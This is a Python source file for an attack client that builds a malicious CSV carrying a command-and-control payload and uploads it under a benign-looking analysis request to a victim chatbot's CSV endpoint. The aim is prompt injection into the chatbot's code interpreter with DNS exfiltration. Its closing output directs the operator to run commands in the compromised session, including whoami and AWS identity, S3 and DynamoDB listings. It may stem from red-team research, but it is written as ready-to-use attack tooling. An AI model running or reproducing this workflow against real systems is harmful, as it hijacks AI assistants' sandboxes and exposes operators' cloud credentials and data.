"""HTTP client for sending prompt injection attacks to victim chatbot."""

import os
import tempfile
from typing import Optional

import requests

from .config import get_config
from .payload_generator import generate_malicious_csv, generate_session_id


class AttackClient:
    """
    HTTP client for sending prompt injection payloads to victim chatbot.

    This class encapsulates the attack workflow:
    1. Generate malicious CSV with embedded C2 payload
    2. Send to victim's /analyze/csv endpoint
    3. Track session for C2 interaction
    """

    def __init__(
        self,
        target_url: str,
        c2_domain: str = None,
        verbose: bool = False,
    ):
        """
        Initialize the attack client.

        Args:
            target_url: Victim chatbot URL (e.g., https://chatbot.victim.com)
            c2_domain: C2 server domain (from config if not specified)
            verbose: Enable verbose output
        """
        config = get_config()
        self.target_url = target_url.rstrip("/")
        self.c2_domain = c2_domain or config.domain
        self.verbose = verbose
        self.session_id = None

    def log(self, message: str, level: str = "info") -> None:
        """Log a message with optional verbosity control."""
        prefixes = {
            "info": "[*]",
            "success": "[+]",
            "error": "[-]",
            "warning": "[!]",
            "debug": "[D]",
        }
        prefix = prefixes.get(level, "[*]")

        if level == "debug" and not self.verbose:
            return

        print(f"{prefix} {message}")

    def generate_payload(self, output_path: str = None) -> str:
        """
        Generate malicious CSV with embedded payload.

        Args:
            output_path: Optional path for CSV file

        Returns:
            Path to generated CSV file
        """
        if output_path is None:
            fd, output_path = tempfile.mkstemp(suffix=".csv", prefix="attack_")
            os.close(fd)

        self.session_id = generate_session_id()

        generate_malicious_csv(
            c2_domain=self.c2_domain,
            session_id=self.session_id,
            output_path=output_path,
            injection_row=3,
            injection_style="technical",
        )

        self.log(f"Generated payload: {output_path}", "success")
        self.log(f"Session ID: {self.session_id}", "info")

        return output_path

    def send_attack(
        self,
        csv_path: str,
        message: str = "Please analyze the revenue by customer and show me the top performers",
        timeout: int = 120,
    ) -> dict:
        """
        Send malicious CSV to victim's analyze endpoint.

        Args:
            csv_path: Path to malicious CSV file
            message: Analysis request message (camouflage)
            timeout: Request timeout in seconds

        Returns:
            Dict with status and response info
        """
        url = f"{self.target_url}/analyze/csv"

        self.log(f"Target URL: {url}", "info")
        self.log("Sending attack...", "info")

        try:
            with open(csv_path, "rb") as f:
                files = {"file": ("customer_analysis.csv", f, "text/csv")}
                data = {"message": message}

                response = requests.post(url, files=files, data=data, timeout=timeout)

            if response.status_code == 200:
                result = response.json()
                self.log("Attack sent successfully!", "success")
                self.log(
                    f"Response preview: {str(result.get('response', ''))[:200]}...",
                    "debug",
                )

                return {
                    "status": "success",
                    "session_id": self.session_id,
                    "response": result,
                }

            else:
                self.log(f"HTTP {response.status_code}: {response.text[:200]}", "error")
                return {
                    "status": "error",
                    "session_id": self.session_id,
                    "error": f"HTTP {response.status_code}",
                    "detail": response.text[:500],
                }

        except requests.exceptions.Timeout:
            self.log("Request timed out (payload may be executing)", "warning")
            return {
                "status": "timeout",
                "session_id": self.session_id,
                "message": "Request timed out - payload execution likely in progress",
            }

        except requests.exceptions.ConnectionError as e:
            self.log(f"Connection error: {e}", "error")
            return {
                "status": "connection_error",
                "session_id": self.session_id,
                "error": str(e),
            }

        except Exception as e:
            self.log(f"Unexpected error: {e}", "error")
            return {
                "status": "error",
                "session_id": self.session_id,
                "error": str(e),
            }

    def run_full_attack(self, message: str = None) -> str:
        """
        Execute full attack workflow.

        Args:
            message: Optional custom analysis message

        Returns:
            Session ID for C2 interaction
        """
        print("\n" + "=" * 70)
        print("  PROMPT INJECTION ATTACK - DNS EXFILTRATION")
        print("=" * 70)

        print(f"\n  Target:     {self.target_url}")
        print(f"  C2 Domain:  {self.c2_domain}")
        print()

        # Step 1: Generate payload
        print("-" * 70)
        print("  STEP 1: Generate malicious CSV")
        print("-" * 70)
        csv_path = self.generate_payload()

        # Step 2: Send to victim
        print()
        print("-" * 70)
        print("  STEP 2: Send to victim chatbot")
        print("-" * 70)

        if message is None:
            message = "Please analyze the revenue data and show me the top 10 customers by total revenue."

        result = self.send_attack(csv_path, message)

        # Step 3: Report results
        print()
        print("-" * 70)
        print("  RESULT")
        print("-" * 70)

        if result["status"] == "success":
            print("\n  [SUCCESS] Attack delivered successfully!")
        elif result["status"] == "timeout":
            print("\n  [LIKELY SUCCESS] Request timed out - payload probably executing")
        else:
            print(f"\n  [ISSUE] {result.get('error', 'Unknown error')}")

        print(f"\n  Session ID: {self.session_id}")

        # Cleanup temp file
        try:
            os.unlink(csv_path)
        except:
            pass

        print()
        print("=" * 70)
        print("  NEXT STEPS")
        print("=" * 70)
        print(
            f"""
  The payload should now be running in the victim's Code Interpreter.
  Use the C2 CLI to interact with the compromised session:

  1. Send a command:
     c2 send "whoami" -s {self.session_id}

  2. Get output:
     c2 receive -s {self.session_id}

  3. Or attach interactively:
     c2 attach {self.session_id}

  4. Example commands to run:
     c2 send "aws sts get-caller-identity" -s {self.session_id}
     c2 send "aws s3 ls" -s {self.session_id}
     c2 send "aws dynamodb list-tables" -s {self.session_id}
"""
        )
        print("=" * 70 + "\n")

        return self.session_id
